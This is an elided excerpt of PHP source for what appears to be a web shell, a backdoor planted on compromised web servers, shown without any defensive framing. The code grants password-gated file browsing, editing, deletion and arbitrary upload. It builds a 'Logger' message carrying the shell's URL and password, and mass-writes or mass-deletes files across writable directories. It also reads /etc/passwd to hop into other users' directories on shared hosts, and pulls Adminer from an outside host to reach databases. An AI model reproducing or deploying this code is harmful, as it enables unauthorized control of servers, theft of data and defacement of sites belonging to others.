...
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
	if (empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password))) {
        ...
        'subject' => 'Logger',
        'message' => 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].$password,
...
<table align="center" width="60%">
	...
	<tr class="top">
		<td class="first">
			Current Dir : <?php print @pwd() ?> [ <?php print w(curldir(), perms(curldir())) ?> ]
		</td>
		<td><center>
	...
	if ($toolsname === 'makefile') {
		function make_dir($dir, $dirname) {
			if (@mkdir($dir.DIRECTORY_SEPARATOR.$dirname)) {
				print("<script>window.location='?dir=".$dir.'/'.$filename."';</script>");
			} else {
				print("Failed");
			}
		} function make_file($dir, $filename) {
			if (@touch($dir.DIRECTORY_SEPARATOR.$filename)) {
				print("<script>window.location='?action=edit&files=".$dir.'/'.$filename."';</script>");
			} else {
				print("Failed");
			}
		}
	...
	if (is_writable($dir)) {
		...
		foreach ($scandir as $dirx) {
			...
			if ($files === '.') {
				...
				if (file_exists(dirname($dir).DIRECTORY_SEPARATOR.$filename)) {
					@unlink(dirname($dir).DIRECTORY_SEPARATOR.$filename);
				}
			} else {
				if (is_dir($files)) {
					if (is_writable($files)) {
						if (file_exists($location)) {
							print("<tr><td>[ DELETED ] => ".$location."</td></tr>");
							@unlink($location);
	...
	if (is_writable($dir)) {
		...
		foreach ($scandir as $dirx) {
			...
			if ($file === '.') {
				...
				if (is_dir($file)) {
					if (is_writable($file)) {
						print("<tr><td>[ DONE ] => ".$dir.DIRECTORY_SEPARATOR.$dirx."</td>");
						@file_put_contents($location, $text);
...
die();
	...
	if ($toolsname === 'upload') {
		if (isset($_POST['upload'])) {
			if ($_POST['type'] == 'biasa') {
				if (@copy($_FILES['file']['tmp_name'], curldir().'/'.$_FILES['file']['name'])) {
					print("Success");
				} else {
					print("Failed");
				}
			...
			if (@copy($_FILES['file']['tmp_name'], $home.'/'.$_FILES['file']['name'])) {
				print("Success");
			} else {
				print("Failed");
			}
	...
	if ($toolsname === 'jumping') {
		...
		if (@preg_match("/hsphere/", @curldir())) {
			...
			if (isset($_POST['jump'])) {
					...
					while ($gets = @fgets($f)) {
						...
						if (is_dir($dir_user) === true) {
							...
							if (is_readable($url_user)) {
								$i++;
								$nb = "[ R ] <a href='?dir=".$url_user."'>".$url_user."</a>";
				...
				print("Total ".$i." room di ".gethostbyname($_SERVER['HTTP_HOST'])."");
			}
		} else {
			print("<table align=center width=60%>
			      <tr><th>Jumping</th></tr>");
		...
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<center><font color=red>Can't read /etc/passwd</font>");
	...
	if ($toolsname === 'adminer') {
		...
		function adminer($full, $text) {
		   ...
		   @flush();
			...
			print("<a href='".$full.DIRECTORY_SEPARATOR."adminer.php'>Adminer Login</a>");
		} else {
			if (@adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
				print("<a href='".$full.DIRECTORY_SEPARATOR."adminer' target='_blank'>Adminer Login</a>");
			} else {
    ...
    echo "<center><a href='?dir=".curldir().DIRECTORY_SEPARATOR.$dir."/.config/config'>Done</a></center>";
  }
  die();
	}
} function curldir() {
	...
	if (isset($_POST['name'])) {
		if (@file_exists($dir)) {
			if (@rename($dir, $_POST['name'])) {
				$nb = "<script>window.location='?action=renames&dir=".curldir()."&files=".$_POST['name']."';</script>";
			} else {
				$nb = "Failed";
			}
		}
  ...
  if (@$_GET['action'] == 'edit' and isset($_GET['files'])) {
	...
	foreach (scdir() as $folder) {
		if(!is_dir(curldir().DIRECTORY_SEPARATOR.$folder)) continue;
		if($folder === '.' || $folder === '..') continue;
			$tool = "
			<a href='?action=renames&dir=".curldir()."&files=".$folder."'>Rename</a>
		    <a href='?action=delete&dir=".curldir()."&files=".$folder."'>Delete</a>";
		print("<tr class='hover'><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='> ");
		print("<div class='dropdown'>");
		print("<a class='dropbtn' href='?dir=".curldir().DIRECTORY_SEPARATOR.$folder."'>".$folder."<a>");
	...
	foreach (scdir() as $file) {
		if(!is_file(curldir().DIRECTORY_SEPARATOR.$file)) continue;
		$tools = "
		<a href='?action=view&dir=".@curldir()."&files=".@curldir().SEP.$file."'>
		View</a>
		<a href='?action=renames&dir=".@curldir()."&files=".@curldir().SEP.$file."'>
		Rename</a>
		<a href='?action=chmods&dir=".@curldir()."&files=".@curldir().SEP.$file."'>
		Chmod</a>
		<a href='?action=delete&dir=".@curldir()."&files=".@curldir().SEP.$file."'>
		Delete</a>
		<a href='?action=download&dir=".@curldir()."&files=".@curldir().SEP.$file."'>
		Download</a>";
		...
		print("<div class='dropdown'>");
		print("<a class='dropbtn' href='?action=edit&dir=".@curldir()."&files=".@curldir().SEP.$file."'>".$file."</a>");
		print("<div class='dropdown-content'>");
		print($tools);
